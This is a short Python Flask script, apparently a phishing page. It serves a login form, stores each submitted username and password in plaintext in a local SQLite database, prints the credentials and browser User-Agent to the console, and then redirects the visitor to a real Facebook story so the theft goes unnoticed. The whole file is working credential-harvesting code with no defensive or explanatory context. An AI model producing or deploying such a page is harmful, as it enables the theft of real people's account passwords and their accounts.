from flask import *
import logging
import sqlite3

banco = sqlite3.connect('.database/sql.db',check_same_thread=False)
cursor = banco.cursor()
sql = 'SELECT * FROM dados WHERE id = ? '
def create(n, s):
    cursor.execute("CREATE TABLE IF NOT EXISTS dados (id integer PRIMARY KEY AUTOINCREMENT, nome text,  senha text) ")
    cursor.execute(f"INSERT INTO dados (nome, senha) VALUES(?,?)", (n,s))
    banco.commit()
    
def read(n):
    for row in cursor.execute(sql, (n)):
        id = row[0]
        login = row[1]
        senha = row[2]
        return login, senha
    

def page():
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    app = Flask(__name__)
    dv = '-'*30
    #PAGINA RAIZ
    @app.route('/', methods=['GET', 'POST'])
    def index():
        if request.method == 'GET':
             print ('Iniciado!\n', dv)
             return render_template('index.html')
        elif request.method == 'POST':
            user = request.form['USER']
            senha = request.form['SENHA']
            create(user,senha)
            agent = request.headers.get('User-Agent')
            print ('Usuario:', user, '\nSenha:', senha,'\nUser-Agent:', agent,'\n',dv)
            return redirect('https://m.facebook.com/story.php?story_fbid=1891658567727372&id=1742362939323603&eav=AfYIpFzN4U1VTD-yprf60SldYjdYUy8tzFCRnmHXk8w5i0UsZ0eNHhKY73te_NjHJQM&paipv=0&_rdr')
    app.run()